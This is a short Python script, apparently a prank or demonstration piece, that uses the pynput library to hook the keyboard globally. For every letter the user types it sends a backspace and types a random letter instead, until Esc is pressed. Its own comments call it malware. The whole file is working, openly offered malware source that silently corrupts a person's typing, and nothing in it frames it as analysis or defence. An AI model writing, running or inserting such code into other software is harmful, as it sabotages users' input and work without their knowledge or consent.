import random
from pynput import keyboard
from pynput.keyboard import Key, Controller

# global variables
listener = None
keyboardController = Controller()
charKeys = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
            'h', 'i', 'j', 'k', 'l', 'm', 'n',
            'o', 'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', 'A', 'B',
            'C', 'D', 'E', 'F', 'G', 'H', 'I',
            'J', 'K', 'L', 'M', 'N', 'O', 'P',
            'Q', 'R', 'S', 'T', 'U', 'V', 'W',
            'X', 'Y', 'Z']
changeKeyPressing = False


# on press method.
def on_press(key):
    global listener, charKeys, keyboardController, changeKeyPressing
    # if the esc key is pressed, then escape the logic loop.
    if key == Key.esc:
        listener.stop()
        print("listener stopped")
    # if the key being pressed is not the malware key then continue with the process.
    elif not changeKeyPressing:
        # if the key has a char attribute.
        if hasattr(key, "char"):
            # if the key pressed is in alphabetic character list then continue.
            if key.char in charKeys:
                # change the boolean to ensure the laptop knows the malware is pressing the keys.
                changeKeyPressing = True
                # delete the last key pressed by the user.
                keyboardController.type("\b")
                # get a random item from the char keys.
                item = random.choice(tuple(charKeys))
                # type the character key out in place of the key the user pressed.
                keyboardController.type(item)
    # if the malware is typing then run this. Check to see if the key pressed by the malware is a character key.
    elif hasattr(key, "char"):
        # if the character key is in the alphabetic keys list then continue.
        if key.char in charKeys:
            changeKeyPressing = False


# Main method.
if __name__ == '__main__':
    # listener begins.
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("listener started")
    # listener joins main thread.
    listener.join()
